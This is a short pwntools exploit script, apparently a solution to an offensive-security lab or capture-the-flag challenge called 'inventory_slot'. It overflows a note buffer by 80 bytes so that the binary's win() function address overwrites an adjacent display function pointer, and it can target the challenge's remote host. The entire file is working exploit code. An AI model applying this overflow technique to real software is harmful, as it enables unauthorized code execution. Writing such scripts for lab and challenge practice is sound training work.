#!/usr/bin/env python3
from pwn import *
HOST = "offsec.m0lecon.it"
PORT = 13582
context.binary = elf = ELF('/home/kali/Desktop/offsec/labs/lab10/challenges/01_inventory_slot/inventory_slot', checksec=False)

def conn():
    if args.REMOTE:
        return remote(HOST, PORT)
    return process(elf.path)

p = conn()

OFFSET_TO_DISPLAY = 64+8+8      # bytes from start of `note` to slot->display: note + prev_size(8 bytes) + flags (8 bytes)
WIN = elf.sym.win               # address of win() in the binary, NO PIE

payload = flat(
    b'A' * OFFSET_TO_DISPLAY,
    p64(WIN),
)

p.sendafter(b'content: ', payload)
print(p.recvall(timeout=2).decode(errors='replace'))
